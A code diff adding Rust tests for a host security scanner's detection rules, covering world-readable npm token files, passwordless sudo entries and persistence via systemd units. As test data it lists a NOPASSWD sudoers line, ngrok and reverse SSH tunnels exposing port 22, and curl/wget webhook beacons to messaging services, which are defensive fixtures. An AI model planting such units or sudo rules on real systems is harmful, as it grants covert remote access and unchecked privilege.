@@ -594,12 +594,24 @@ fn cred_readable_token_file_004() {
         &[
             ("kind", s("npmrc")),
             ("readable_by_others", Value::Bool(true)),
+            ("holds_secret", Value::Bool(true)),
         ],
         &[
             ("kind", s("npmrc")),
             ("readable_by_others", Value::Bool(false)),
+            ("holds_secret", Value::Bool(true)),
         ],
     );
+    // World-readable and holding nothing (an .npmrc that only sets a prefix): not a finding.
+    assert!(!fires(
+        "credential_stores",
+        vec![fact(&[
+            ("kind", s("npmrc")),
+            ("readable_by_others", Value::Bool(true)),
+            ("holds_secret", Value::Bool(false)),
+        ])],
+        "BLWK-CRED-004",
+    ));
     assert!(!fires(
         "credential_stores",
         vec![fact(&[
@@ -608,6 +620,81 @@ fn cred_readable_token_file_004() {
         ])],
         "BLWK-CRED-004",
     ));
+}
+
+#[test]
+fn priv_passwordless_sudo_001() {
+    assert_matrix(
+        "sudoers",
+        "BLWK-PRIV-001",
+        &[
+            ("source", s("/etc/sudoers.d/deploy")),
+            ("line", s("deploy ALL=(ALL) NOPASSWD: ALL")),
+            ("nopasswd", Value::Bool(true)),
+            ("how", s("the NOPASSWD tag")),
+        ],
+        &[
+            ("source", s("/etc/sudoers.d/alice")),
+            ("line", s("alice ALL=(ALL) ALL")),
+            ("nopasswd", Value::Bool(false)),
+            ("how", s("")),
+        ],
+    );
+}
+
+#[test]
+fn persist_systemd_tunnel_001_and_messaging_002() {
+    let unit = |exec: &str, reverse: bool| {
+        vec![fact(&[
+            ("unit_name", s("x.service")),
+            ("exec_start", s(exec)),
+            ("reverse_ssh_tunnel", Value::Bool(reverse)),
+            ("has_install_section", Value::Bool(true)),
+        ])]
+    };
+    for (exec, reverse) in [
+        ("/usr/local/bin/ngrok tcp 22 --authtoken ****", false),
+        ("/usr/bin/cloudflared tunnel run", false),
+        ("/usr/bin/ssh -N -R 2222:localhost:22 u@h", true),
+    ] {
+        assert!(
+            fires("systemd_units", unit(exec, reverse), "BLWK-PERSIST-001"),
+            "{exec}"
+        );
+    }
+    for exec in [
+        "/usr/sbin/sshd -D $SSHD_OPTS",
+        "/usr/bin/rsync -aR -e ssh /srv/ backup@h:/srv/",
+        "/usr/lib/systemd/systemd-logind",
+        "",
+    ] {
+        assert!(
+            !fires("systemd_units", unit(exec, false), "BLWK-PERSIST-001"),
+            "{exec}"
+        );
+    }
+    // The collector keeps only the host of an address, so the services are matched by host.
+    for exec in [
+        "/usr/bin/curl -s https://api.telegram.org/… -d chat_id=1 -d text=up",
+        "/bin/sh -c 'curl -s -X POST https://discord.com/… -d content=up'",
+        "/usr/bin/wget -qO- https://hooks.slack.com/…",
+    ] {
+        assert!(
+            fires("systemd_units", unit(exec, false), "BLWK-PERSIST-002"),
+            "{exec}"
+        );
+    }
+    for exec in [
+        "/usr/bin/curl -fsS https://hc-ping.com/…",
+        "/usr/bin/telegram-desktop",
+        "/usr/lib/slack/slack --no-sandbox",
+        "/usr/libexec/curl-config-check",
+    ] {
+        assert!(
+            !fires("systemd_units", unit(exec, false), "BLWK-PERSIST-002"),
+            "{exec}"
+        );
+    }
 }
 
 #[test]
